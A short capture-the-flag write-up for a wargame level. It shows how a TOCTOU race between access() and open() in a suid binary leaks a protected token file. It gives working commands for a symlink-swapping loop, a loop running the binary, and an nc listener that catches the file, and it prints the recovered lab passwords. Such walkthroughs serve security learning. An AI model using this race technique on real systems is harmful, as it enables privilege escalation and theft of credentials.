@@ -1,0 +1,43 @@
+for this level we have a suid binary own by the user flag10
+and a token file with read permission to the owner
+
+$> ./level10
+./level10 file host
+        sends file to host if you have access to it
+
+after disassembling the binary we can see the protection here
+	if (access(argv[1], R_OK)) {
+		// open a socket to ip argv[2] and port 6969
+		fd = open(argv[1], 0);
+	}
+
+here we can perform a race condition attack since there is a delay
+between the access right check and the open of file
+
+to do so, we need to run three thing in parallel, so we need 3 ttys
+
+first one will make a loop that change rapidly
+where a symlink point to form the token file and a empty file
+
+$> touch /tmp/empty
+$> while :; do ln -fs /tmp/empty /tmp/lv10; ln -fs ~/token /tmp/lv10; done
+
+then we will run a race condition attack on the level10 binary
+
+$> while :; do ./level10 /tmp/lv10 127.0.0.1; done
+
+we use the third tty as a receive server on port 6969
+with a grep filter to dump the garbage
+
+$> nc -lk 6969 | grep -v " "
+woupa2yuojeeaaed06riuj63c
+
+it's the flag10's password
+
+$> su flag10
+Password: _
+
+$> getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+this token is the level11's password
